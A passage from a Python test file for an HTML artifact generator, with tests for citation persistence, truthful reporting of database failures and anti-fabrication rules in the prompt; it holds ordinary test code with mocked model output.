    """Artifact with real UUID citations is safely persisted and restored via GET."""
    session = create_session(db=db_session, title="Real Citation Persistence Session")
    citation = _mock_citation(
        title="Jason Lemkin Sales Rules",
        guest="Jason Lemkin",
        content="Do not hire reps until you have closed 10 deals yourself.",
    )

    mock_retrieval = MagicMock(spec=SemanticRetrievalService)
    mock_retrieval.retrieve.return_value = RetrievalResponse(
        query="Jason Lemkin sales rules",
        status="success",
        items=[citation],
        coverage=_mock_coverage(),
        disclaimer=None,
    )

    mock_pi = MagicMock(spec=PiClient)
    mock_pi.generate_response = AsyncMock(
        return_value=PiGenerationResult(
            text=(
                "TITLE: Jason Lemkin Playbook\n"
                "```html\n"
                "<div class='playbook'><h1>Founder Sales Playbook</h1></div>\n"
                "```\n"
                "```css\n"
                ".playbook { color: #fff; }\n"
                "```\n"
            ),
            provider="google",
            model="gemini-3.8-flash",
            raw_events=[],
        )
    )

    orchestrator = HtmlArtifactOrchestrator(
        pi_client=mock_pi,
        retrieval_service=mock_retrieval,
    )

    res = await orchestrator.generate_artifact(
        session_id=session.id,
        prompt="Build a sales playbook based on Jason Lemkin's podcast",
        include_podcast_context=True,
        provider="google",
        model="gemini-3.8-flash",
        db=db_session,
    )

    # Truthful persistence status
    assert res.is_persisted is True
    assert not any("Persistence error" in d for d in res.diagnostics)
    assert len(res.citations) == 1

    # Verify retrieval via GET endpoint
    get_res = client.get(f"/api/sessions/{session.id}/artifact")
    assert get_res.status_code == 200
    data = get_res.json()
    assert data["session_id"] == str(session.id)
    assert data["title"] == "Jason Lemkin Playbook"
    assert data["is_persisted"] is True
    assert len(data["citations"]) == 1
    assert data["citations"][0]["guest_name"] == "Jason Lemkin"
    assert data["citations"][0]["episode_id"] == str(citation.episode_id)


# ---------------------------------------------------------------------------
# 19. Truthful Handling of Database Persistence Failure
# ---------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_artifact_persistence_failure_truthful_reporting(db_session: Session):
    """When DB persistence encounters an error, rollback occurs and is_persisted is False."""
    session = create_session(db=db_session, title="Persistence Failure Session")

    mock_pi = MagicMock(spec=PiClient)
    mock_pi.generate_response = AsyncMock(
        return_value=PiGenerationResult(
            text=(
                "TITLE: Fallback Test Artifact\n"
                "```html\n"
                "<div>Fallback</div>\n"
                "```\n"
                "```css\n"
                "div { color: red; }\n"
                "```\n"
            ),
            provider="ollama",
            model="qwen2.5:1.5b",
            raw_events=[],
        )
    )

    orchestrator = HtmlArtifactOrchestrator(pi_client=mock_pi)

    # Force database persistence failure in create_message
    with patch(
        "backend.app.agent.skills.html_artifact.orchestrator.create_message",
        side_effect=RuntimeError("Simulated PostgreSQL connection failure"),
    ):
        res = await orchestrator.generate_artifact(
            session_id=session.id,
            prompt="Build a dashboard",
            title="Dashboard",
            db=db_session,
        )

    # Truthful outcome: Generation succeeded, but persistence failed
    assert res.is_persisted is False
    assert any("Persistence error" in d for d in res.diagnostics)
    assert any("Database save failed" in d for d in res.diagnostics)
    # Generated content is preserved in memory for user inspection
    assert len(res.html) > 0
    assert len(res.css) > 0


# ---------------------------------------------------------------------------
# 20. Anti-Fabrication Prompt Constraints
# ---------------------------------------------------------------------------
def test_prompt_contains_anti_fabrication_marketing_constraints():
    """Verify that build_artifact_prompt explicitly forbids invented claims."""
    prompt = build_artifact_prompt(
        user_prompt="Build an AI SaaS landing page",
        title="AI SaaS",
        artifact_type="landing_page",
    )

    assert "Truthful Content & No Fabricated Marketing Claims" in prompt
    assert "DO NOT invent customer counts" in prompt
    assert "DO NOT invent revenue statistics" in prompt
    assert "DO NOT invent official partnerships" in prompt
    assert "DO NOT invent software release versions" in prompt

